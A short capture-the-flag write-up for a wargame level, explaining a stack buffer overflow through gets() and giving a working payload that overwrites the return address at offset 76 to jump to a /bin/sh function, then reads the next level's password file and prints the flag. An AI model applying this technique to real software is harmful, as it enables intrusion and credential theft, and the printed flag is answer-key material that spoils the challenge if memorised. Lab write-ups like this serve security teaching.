# Level 1

**Vulnerability:** Stack buffer overflow via `gets()`.

## Walkthrough

`main` reads into a 64-byte buffer with `gets()`, which has no bounds checking.
An unused `run()` function at `0x8048444` calls `system("/bin/sh")` — it is never
called normally, so we redirect execution to it by overwriting the saved return
address.

Fuzzing shows the saved EIP sits at **offset 76** (a pattern crash lands the first
overflow byte at position 77, so 76 bytes of padding reach the return address).

## Exploit

```sh
python -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/payload
cat /tmp/payload - | ./level1
cat /home/user/level2/.pass
```

**Flag:** `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
